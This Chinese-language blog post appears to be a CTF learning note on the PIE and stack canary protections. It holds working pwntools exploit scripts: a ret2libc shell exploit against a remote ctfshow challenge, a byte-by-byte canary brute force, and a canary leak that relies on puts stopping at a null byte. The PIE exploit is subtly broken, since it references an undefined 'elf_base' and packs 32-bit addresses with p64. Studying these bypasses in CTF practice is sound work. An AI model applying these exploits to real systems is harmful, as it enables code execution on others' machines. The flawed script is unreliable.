---
title: pwn-canary保护和pie保护
cover: rgb(117,117,255)
date: 2025-04-02 17:30:00
categories: 技术分享
tags:
  - 网安
  - pwn
---



## 总述

本文主要讲解pie保护和canary保护机制。

了解基础了pie保护绕过。

了解三大canary绕过方法。

简单讲解了各个保护的用途很其影响。

## 保护机制

在pwn的过程中我们会遇到很多保护机制，这些机制会保护程序的运行，使我们的攻击不会那么轻松就可以达成，面对不同的保护机制，我们需要有不同的绕过方法，来实现正确的攻击。

### Full RELRO

保护原理，不允许你改写got表中的内容了。

影响：不能劫持stack_chk_fail函数来绕过canary了，不能在劫持动态链接里面已经调用过的函数。

### Canary

在栈的末尾加插入一个值，退出函数时检查canary是不是原来的值，如果不是就调用stack_chk_fail函数退出程序。

影响：不能轻易的栈溢出了。需要泄露canary值，或者劫持stack_chk_fail函数，或者爆破canary。

### NX

然栈上面写入的东西不能被执行。

影响：不能直接使用shellcode提升权限了。

### pie

把文件内部地址随机化，每次都是随机的地址。

影响：不能轻易查看函数地址和调用内部函数或者指令了，在ida只能看见部分地址，也就是pie偏移量。需要获得pie基地址。

## pie(ASLR)

 PIE（Position Independent Executable，位置无关可执行文件）保护机制是一种在现代操作系统中用于增强程序安全性的技术。 地址空间随机化。

### 原理：

 PIE 通过将程序的代码和数据在内存中的加载地址随机化，使得攻击者难以预测程序中函数和变量的具体内存位置。在没有 PIE 保护的情况下，程序通常会被加载到固定的内存地址，攻击者可以利用已知的程序结构和内存布局来进行攻击，如缓冲区溢出攻击中，攻击者可以精确地计算出要覆盖的函数返回地址等关键信息。而 PIE 机制使得每次程序运行时，其在内存中的位置都是不同的，这就增加了攻击者进行攻击的难度，因为他们**无法事先确定目标函数和数据的准确地址。** （这个就是pie保护的目的）

简单来说，我们的攻击是建立在一个个具体函数或者指令的地址上面的，如果地址变得不可预测，那么pwn攻击就会受到阻碍。

开启pie保护之后的标志是我们在**ida**只能看见后面**两个字节**的地址了，因为前面的地址都变成了随机的（每一次启动程序都会改变的）**pie基地址**。基地址的最后三位一定是0，（这个和libc的基地址很像但是这两个是不一样的）

**libc基地址和pie基地址的区别：**

pie是作用于文件内部的地址的，也就是说是文件本身的那些函数和指令的地址会变成：真实地址=pie基地址+pie的偏移量。如：计算自定义函数backdoor，还有main等，那么：`backdoor_addr= pie_base +pie_offset`，这里用到的就是文件内部的函数。

libc是作用于动态链接库的，也就是说改变的是动态链接库内部函数的真实地址：真实地址=libc基地址+libc偏移量。如：system函数在文件内部是没有的，我们取动态链接库内寻找，那么真实地址是由libc来决定的。
`libc_base = system_address - system_offset`，system本身也是libc库内部的函数。

如果是`ret`这样的指令计算使用 `libc` 基地址还是 `PIE` 基地址，取决于 `ret` 指令所在的位置。如果是libc库内部的就用libc算，如果是ida发现的文件自带，就是pie算。  

### 绕过方法：

第一种：**改写后面的两个字节**

程序的加载地址一般是以内存页为单位的，所以程序的基地址的最后三个数字一定为0。那么再由前文的“最后三个数是该地址与程序加载地址的偏移量”就可以知道这些数据的最后三个数就是实际地址的最后三个数。那么我们就可以知道怎么绕过pie了，我们只需要将数据的最后四个数（两个字节）修改一下就可以了。

如果是最后三个数是确定的，那么我们就只需要去改变倒数第四个数就ok了。那么通过写脚本，将返回地址最多改变16次就可以得到了

第二种：**信息泄露地址**

如果我们可以获得一些文件内部的函数或者数据的具体地址，就可以利用这个具体地址来计算pie的基地址。

根据公式`real_addr=pie_addr+pie_offset`.计算出pie基地址，然后找到需要的函数的偏移量，二者相加就可以得到真实地址。

### 案例：

这里用ctfshow平台的pwn31题作为案例进行分析：

检查文件（32位）可以看见除了canary基本保护都开了，有开启pie保护。地址都只能看见后面3位。

![pEyocJ1.png](https://s21.ax1x.com/2025/04/02/pEyocJ1.png)

![pEyogRx.png](https://s21.ax1x.com/2025/04/02/pEyogRx.png)

打开ida发现给了main函数的真实地址：利用真实地址来获得pie的基地址。

![pEyo2z6.png](https://s21.ax1x.com/2025/04/02/pEyo2z6.png)

这里给了(0x100-0x88-4)=0x14个溢出量，在32位就是可以填写5个4字节（地址）内容。

![pEyofsO.png](https://s21.ax1x.com/2025/04/02/pEyofsO.png)

我们可以利用main真实地址去计算puts_plt和puts_got。接下来就是正常的ret2libc->获得puts真实地址，用puts去计算libc，然后去获得链接库内的system和binsh，最后利用他们来getshell。

exp如下：

```python
from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='i386', os='linux')

io = remote('pwn.challenge.ctf.show', 28192)

main_addr = int(io.recv(10), 16)
success('main_addr----->' + hex(main_addr))
#在ida里面找一下这些函数的偏移量
pie_base = main_addr - 0x652
puts_plt = pie_base + 0x490
puts_got = pie_base + 0x1FD4
got = elf_base + 0x1FC0		#因为ebx内部存的地址决定了我们第二次溢出时填写的位置，要保持不变。
#在ebx内部保留了got表地址，不让它改变。
payload = b'a'*132 + p32(got)+b'a'*4+p32(puts_plt) + p32(main_addr) +p64(puts_got)
io.send(payload)
io.recvuntil(b'\n')
puts_addr = u32(io.recv(4).ljust(4,b'\x00'))
success('puts_addr---->'+hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = b'a'*132 + p32(got)+b'a'*4+p32(system) + p32(main_addr) +p64(binsh)
io.sendline(payload)
io.interactive()
```

这题展示了如何利用地址算pie基地址，然后获得我们需要的内部函数的地址。

## canary

 Canary 的意思是金丝雀，是一种用于防止栈溢出攻击的安全机制 。 栈溢出攻击是一种常见的缓冲区溢出攻击类型，攻击者通过向程序栈中写入超过缓冲区边界的数据，覆盖相邻的栈帧数据，包括返回地址等，从而改变程序的执行流程，执行恶意代码。为了抵御这种攻击，Canary 保护机制应运而生。 

### 原理：

 Canary 保护机制的核心思想是在函数栈帧中插入一个特殊的值（即 Canary 值），并在函数返回时检查该值是否被修改。如果 Canary 值被改变，说明栈可能发生了溢出， 然后会去调用stack_chk_fail函数退出程序。在程序启动的时候会随机生成一个canary值，一般放在ebp-0x8这个位置。 Canary 值的**最后一个字节**可能被设置为 0x00，这样可以利用字符串处理函数遇到 0x00 时会停止的特性，方便在检测 Canary 是否被修改时进行判断。 

这就是相当于在出门前放了一张卡片在门口，我们回来时候发现卡片位置不对了，就知道有人来动手脚了。当然我们现在知道主人放卡片了，就有办法迷惑他，让他不知道我们动手脚了。

### 绕过方法：

绕过方法主要就是获得canary让它保持原来的值，或者改变canary然值和我们填写的一样，又或者利用检查canary的机制，在检查的时候动手脚

主要有下面几种，其他的up还没学：

#### 一：格式化字符串漏洞泄露canary

我们学习过格式化字符串泄露任意地址，canary本质还是在栈上面的一个值，我们通过计算偏移量，就可以把canary的具体值给泄露出来，找到相对ebp的偏移然后-1，当然有些canary的值其实不是在（ebp-0x8）这个位置，但是我们可以打开ida，一般来说函数最下面的那个变量的位置就是canary的位置，然后去计算就可以了。



#### 二：one-by-one爆破canary

 对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 

案例basectf2024：没有canary我要死了：

伪随机数绕过加上canary：

```python
from pwn import *
from ctypes import *

r = process("./pwn")
def dbg():
    gdb.attach(r)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
seed = libc.time(0)
libc.srand(seed)

canary = b'\x00'

for i in range(7):
    for a in range(256):
        num = libc.rand() % 50
        r.sendlineafter(b'BaseCTF',str(num))
        p = b'a' * 0x68 + canary + p8(a)
        r.send(p)
        r.recvuntil('welcome\n')
        rec = r.readline()
        if b'smashing' not in rec:
            print(f"No.{i + 1} byte is {hex(a)}")
            canary += p8(a)
            break

print(f"canary is {hex(u64(canary))}")
shell = 0x02B1

while(1):
    for i in range(16):
        num = libc.rand() % 50
        r.sendline(str(num))
        p = b'A' * 0x68 + canary + b'A' * 0x8 + p16(shell)
        r.send(p)
        rec = r.readline()
        print(rec)
        if b'welcome' in rec:
            r.readline()
            shell += 0x1000
            continue
        else:
            break

r.interactive()
```



#### 三：劫持__stack_chk_fail 函数

 已知 Canary 失败的处理逻辑会进入到 `__stack_chk_fail`ed 函数，`__stack_chk_fail`ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。 步骤如下：

1. **确定 `__stack_chk_fail` 的 GOT 表地址**

可以通过反汇编程序或者使用工具（如 `readelf`、`objdump`）来查看程序的 GOT 表，找到 `__stack_chk_fail` 的 GOT 表项地址。

2. **找到可利用的漏洞**

通常是缓冲区溢出漏洞或格式化字符串漏洞。利用这些漏洞可以控制程序的执行流程，并修改 `__stack_chk_fail` 的 GOT 表项。

3. **构造 Payload**

Payload 的目的是将 `__stack_chk_fail` 的 GOT 表项中的地址修改为攻击者想要执行的代码地址，比如一个 shellcode 的地址或者一个可以执行系统命令的函数地址。

4. **触发 Canary 检查**

当程序执行到 Canary 检查失败的情况时，会调用 `__stack_chk_fail`，此时程序会跳转到被修改后的地址执行。



#### 四：覆盖 TLS 中储存的 Canary 值

 已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。 



#### 五：利用puts遇0截断

puts函数是C 标准库中的一个输出函数，其原型为 `int puts(const char *s);`，功能是将字符串 `s` 输出到标准输出（通常是终端），并在输出结束后自动添加一个换行符 `'\n'`。

`puts` 函数会从传入的字符串指针开始，逐个字符输出，直到遇到 `'\0'` 为止。一旦遇到 `'\0'`，它就会停止输出，`'\0'` 本身不会被输出。

案例：basectf2024-你为什么不让我溢出：

exp：

```python
from pwn import *
io=process('./pwn')
back=0x4011B6
#gdb.attach(io,'b main')
io.recv()
payload=b'a'*(0x70-8+1)#这里刚刚还压到canary的值导致前面的0都没有了，利用的是canary末尾的\x00。
io.send(payload)
io.recvuntil(b'a'*0x68)
canary=u64(io.recv(8))-0x61 #需要把多压的一位a（61）给减去。因为\0不会被puts输出。
print(hex(canary))
payload=b'a'*0x68+p64(canary)+b'a'*8+p64(0x40101a)+p64(back)
io.sendline(payload)
io.interactive()
```

## 废话

basectf2024的pwn题真的出的很不错，需要练习就去打一打，是我学长出的，非常好，很适合入门。



